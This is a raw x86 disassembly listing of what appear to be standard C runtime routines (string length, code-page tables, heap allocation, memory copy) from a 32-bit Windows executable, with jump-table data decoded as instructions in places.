  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
